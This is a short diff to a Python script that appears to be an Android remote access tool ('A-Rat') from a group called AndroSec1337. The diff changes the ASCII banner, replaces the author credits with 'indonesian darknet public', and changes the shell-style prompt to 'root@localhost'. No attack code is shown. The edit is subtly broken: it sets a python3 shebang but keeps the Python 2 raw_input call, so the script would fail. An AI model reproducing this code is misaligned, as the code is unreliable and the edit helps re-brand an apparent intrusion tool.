@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import os, sys, subprocess
@@ -15,20 +15,19 @@ def logo():
  print("""
 
 
-\t   ▄████████    ▄████████    ▄████████     ███     
-\t  ███    ███   ███    ███   ███    ███ ▀█████████▄ 
-\t ███    ███   ███    ███   ███    ███    ▀███▀▀██ 
-\t ███    ███  ▄███▄▄▄▄██▀   ███    ███     ███   ▀ 
-\t▀███████████ ▀▀███▀▀▀▀▀   ▀███████████     ███     
-\t ███    ███ ▀███████████   ███    ███     ███     
-\t ███    ███   ███    ███   ███    ███     ███     
-\t ███    █▀    ███    ███   ███    █▀     ▄████▀   
-\t               ███    ███                          
+\t█████╗       ██████╗  █████╗ ████████╗
+\t██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝
+\t███████║█████╗██████╔╝███████║   ██║   
+\t██╔══██║╚════╝██╔══██╗██╔══██║   ██║   
+\t██║  ██║      ██║  ██║██║  ██║   ██║   
+\t╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
+                                       
+                          
 
 
-\t [*] Versions : 1.0.0
-\t [*] Coded By ./Xi4u7
-\t [*] AndroSec1337 Cyber Team
+\t [*] Author : an brush fon
+\t [*] Coded By :20k19™
+\t [*] AndroSec1337 indonesian darknet public
   """)
 
 def help():
@@ -48,7 +47,7 @@ def main():
     global host, port, output
 
     while True:
-        cmd = raw_input("[*] A-Rat@AndroSec1337:~# ").lower()
+        cmd = raw_input("[*] root@localhost:~# ").lower()
 
         if cmd == "help":
             help()
